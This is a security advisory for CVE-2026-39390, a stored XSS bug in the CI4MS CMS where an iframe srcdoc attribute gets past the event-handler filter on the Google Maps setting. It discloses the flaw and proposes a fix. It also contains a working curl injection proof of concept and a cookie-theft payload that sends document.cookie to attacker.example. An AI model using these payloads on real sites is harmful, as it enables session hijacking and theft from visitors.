# [M] CI4MS has stored XSS via srcdoc attribute bypass in Google Maps iframe setting

## Summary
Severity: Medium
Advisory: GHSA-x3hr-cp7x-44r2
CVE: CVE-2026-39390
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-08
Source: https://github.com/advisories/GHSA-x3hr-cp7x-44r2
Type: github-advisory

## Affected
- Packagist: `ci4-cms-erp/ci4ms` — affected >=0 <0.31.4.0

## Details
## Summary

The Google Maps iframe setting (`cMap` field) in `compInfosPost()` sanitizes input using `strip_tags()` with an `<iframe>` allowlist and regex-based removal of `on\w+` event handlers. However, the `srcdoc` attribute is not an event handler and passes all filters. An attacker with admin settings access can inject an `<iframe srcdoc="...">` payload with HTML-entity-encoded JavaScript that executes in the context of the parent page when rendered to unauthenticated frontend visitors.

## Details

**Input sanitization** (`modules/Settings/Controllers/Settings.php:49-53`):

```php
$mapValue = trim(strip_tags($this->request->getPost('cMap'), '<iframe>'));
$mapValue = preg_replace('/\bon\w+\s*=\s*"[^"]*"/i', '', $mapValue);
$mapValue = preg_replace('/\bon\w+\s*=\s*\'[^\']*\'/i', '', $mapValue);
$mapValue = preg_replace('/\bon\w+\s*=\s*[^\s>]+/i', '', $mapValue);
setting()->set('Gmap.map_iframe', $mapValue);
```

The three regex patterns only match attributes beginning with `on` (e.g., `onclick`, `onerror`). The `srcdoc` attribute does not begin with `on` and passes through untouched.

**Output rendering** (`app/Views/templates/default/gmapiframe.php:3`):

```php
<?php echo strip_tags($settings->map_iframe,'<iframe>') ?>
```

The output applies `strip_tags` with the same `<iframe>` allowlist but performs no attribute filtering or HTML encoding. The stored payload is rendered verbatim.

**Why HTML entities bypass `strip_tags`**: A payload like `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">` contains only one tag (`<iframe>`), which is in the allowlist. The entity-encoded content (`&lt;script&gt;`) is not recognized as a tag by `strip_tags`. However, when the browser renders the `srcdoc` attribute, it decodes the HTML entities and creates a new browsing context containing `<script>alert(1)</script>`.

**Why this is same-origin**: Per the HTML specification, an `<iframe srcdoc="...">` without a `sandbox` attribute inherits the parent document's origin. The injected script has full access to the parent page's cookies, DOM, and session.

## PoC

**Prerequisites**: Authenticated admin session with `update` role on the Settings module.

**Step 1: Inject the payload**

```bash
curl -X POST 'https://target/backend/settings/compInfos' \
  -H 'Cookie: ci_session=ADMIN_SESSION_ID' \
  -d 'cName=TestCo&cAddress=123+Main+St&cPhone=1234567890&cMail=admin@example.com&cMap=%3Ciframe+srcdoc%3D%22%26lt%3Bscript%26gt%3Balert(document.domain)%26lt%3B%2Fscript%26gt%3B%22%3E%3C%2Fiframe%3E'
```

The `cMap` value decodes to:
```html
<iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;"></iframe>
```

**Step 2: Visit any public page that includes the Google Maps widget**

Navigate to the frontend contact or footer page as an unauthenticated visitor. The browser renders the `srcdoc` iframe, decodes the entities, and executes the script in the parent page's origin.

**Expected result**: JavaScript `alert(document.domain)` fires showing the target's domain, confirming same-origin execution.

**Cookie theft variant**:
```
<iframe srcdoc="&lt;script&gt;document.location='https://attacker.example/steal?c='+document.cookie&lt;/script&gt;"></iframe>
```

## Impact

- **Stored XSS affecting all frontend visitors**: The payload persists in the settings database and executes for every unauthenticated visitor viewing pages that include the Google Maps iframe widget.
- **Session hijacking**: The script executes in the parent page's origin, giving access to session cookies (unless HttpOnly is set) and the full DOM.
- **Credential theft**: An attacker can inject a fake login form or redirect users to a phishing page.
- **Scope change**: The attack crosses from the admin backend trust boundary to the public frontend, affecting users who have no relationship with the backend.

The attack requires a compromised or malicious admin account with settings update permission. While this is a privileged starting point (PR:H), the impact crosses to all unauthenticated visitors (S:C), justifying Medium severity.

## Recommended Fix

Replace the regex-based attribute blocklist with a strict allowlist approach. Only allow `src`, `width`, `height`, `frameborder`, `style`, `allowfullscreen`, and `loading` attributes on iframe tags:

```php
// In modules/Settings/Controllers/Settings.php, replace lines 49-52:
$mapValue = trim(strip_tags($this->request->getPost('cMap'), '<iframe>'));
// Strip all attributes except safe ones for iframes
$mapValue = preg_replace_callback(
    '/<iframe\s+([^>]*)>/i',
    function ($matches) {
        $allowedAttrs = ['src', 'width', 'height', 'frameborder', 'style', 'allowfullscreen', 'loading', 'title'];
        preg_match_all('/(\w+)\s*=\s*(?:"([^"]*)"|\'([^\']*)\'|(\S+))/i', $matches[1], $attrs, PREG_SET_ORDER);
        $safe = '';
        foreach ($attrs as $attr) {
            $name = strtolower($attr[1]);
            $value = $attr[2] ?: $attr[3] ?: $attr[4];
            if (in_array($name, $allowedAttrs, true)) {
                // For src, only allow https URLs (block javascript: etc.)
                if ($name === 'src' && !preg_match('#^https://#i', $value)) {
                    continue;
                }
                $safe .= ' ' . $name . '="' . esc($value) . '"';
            }
        }
        return '<iframe' . $safe . '>';
    },
    $mapValue
);
```

This allowlist approach ensures that dangerous attributes like `srcdoc`, `src` with `javascript:` protocol, and any future dangerous attributes are blocked by default.

## References
- https://github.com/ci4-cms-erp/ci4ms/security/advisories/GHSA-x3hr-cp7x-44r2
- https://nvd.nist.gov/vuln/detail/CVE-2026-39390
- https://github.com/ci4-cms-erp/ci4ms
- https://github.com/ci4-cms-erp/ci4ms/releases/tag/0.31.4.0
